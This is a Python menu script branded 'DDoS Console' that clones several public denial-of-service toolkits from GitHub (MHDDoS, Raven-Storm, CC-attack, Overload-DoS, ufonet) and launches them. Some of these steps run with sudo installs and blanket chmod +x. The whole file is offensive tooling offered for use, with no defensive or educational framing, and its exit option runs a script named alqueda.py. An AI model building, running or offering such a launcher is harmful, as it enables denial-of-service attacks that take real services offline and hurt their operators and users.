import os, sys, time
from time import sleep as timeout
def restart_program():
	os.system(' clear ')
print (" ██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗    ") 
print (" ██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝    ") 
print (" ██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗    ") 
print (" ██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║    ") 
print (" ██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║    ") 
print (" ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ")                                                                                           
time.sleep(2)
print (" [01]> DDoS-Attack ")
print (" [02]> Raven-Storm ")
print (" [03]> CC-attack   ")
print (" [04]> Overload    ")
print (" [05]> Install DDOS")
print (" [06]> MHDDoS 	   ")
print
print (" [00]> Exit 	  ")
print
bhydra = input(" DDoS Console ==>> ")

if bhydra == '01' or bhydra == '1':
	os.system(' clear ')
	os.system(' cd DDos-Attack && python2 ddos-attack.py ')
elif bhydra == '02' or bhydra == '2':
	os.system(' clear ')
	os.system(' cd Raven-Storm && pip3 install -r requirements.txt && python3 main.py ')
elif bhydra == '03' or bhydra == '3':
	os.system(' clear ')
	os.system(' cd CC-attack && python3 cc.py ')
elif bhydra == '04' or bhydra == '4':
	os.system(' clear ')
	os.system(' sudo pip3 install colorama termcolor requests ')
	os.system(' cd Overload-DoS && chmod +x * && ./install-overload ')
elif bhydra == '05' or bhydra == '5':
	os.system(' clear ')
	os.system(' git clone https://github.com/MHProDev/MHDDoS && git clone https://github.com/Ha3MrX/DDos-Attack && git clone https://github.com/epsylon/ufonet && git clone https://github.com/Taguar258/Raven-Storm && git clone https://github.com/Leeon123/CC-attack && git clone https://github.com/codingplanets/Overload-DoS && python2 DDoS-Attacks.py')
elif bhydra == '00' or bhydra == '0':
	os.system(' python2 alqueda.py ')
elif bhydra == '06' or bhydra == '6':
	os.system(' clear ')
	os.system(' cd MHDDoS && pip3 install -r requirements.txt && python3 start.py ')

else:
	print (" ERROR : Wrong Input ")
	time.sleep(1)
	restart_program()